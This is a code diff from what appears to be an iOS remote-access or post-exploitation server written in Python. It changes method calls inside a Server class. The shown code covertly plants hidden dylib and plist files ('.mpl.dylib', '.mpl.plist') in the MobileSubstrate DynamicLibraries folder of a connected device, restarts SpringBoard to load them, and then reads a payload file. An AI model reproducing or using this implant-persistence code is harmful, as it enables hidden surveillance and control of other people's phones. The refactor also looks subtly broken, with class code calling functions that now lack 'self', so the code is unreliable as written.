@@ -7,7 +7,7 @@ import time
 
 downloads_dir = "../downloads"
 
-def upload_file(self,file_path,remote_dir,remote_file_name):
+def upload_file(file_path,remote_dir,remote_file_name):
 		term = binascii.hexlify(os.urandom(16))
 		if os.path.exists(file_path):
 			f = open(file_path,"rb")
@@ -136,13 +136,13 @@ class Server:
             self.verbose_print("Detected iOS")
     	    h.info_general("Uploading dylib 1/2...")
             time.sleep(1)
-            self.upload_file("resources/mpl.dylib","/Library/MobileSubstrate/DynamicLibraries",".mpl.dylib")
+            upload_file("resources/mpl.dylib","/Library/MobileSubstrate/DynamicLibraries",".mpl.dylib")
             h.info_general("Uploading plist 2/2...")
             time.sleep(1)
-            self.upload_file("resources/mpl.plist","/Library/MobileSubstrate/DynamicLibraries",".mpl.plist")
+            upload_file("resources/mpl.plist","/Library/MobileSubstrate/DynamicLibraries",".mpl.plist")
             h.info_general("Respring...")
             time.sleep(2)
-            self.send_command({"cmd":"killall","args":"SpringBoard"})
+            send_command({"cmd":"killall","args":"SpringBoard"})
             f = open("resources/mplios", "rb")
             payload = f.read()
             f.close()
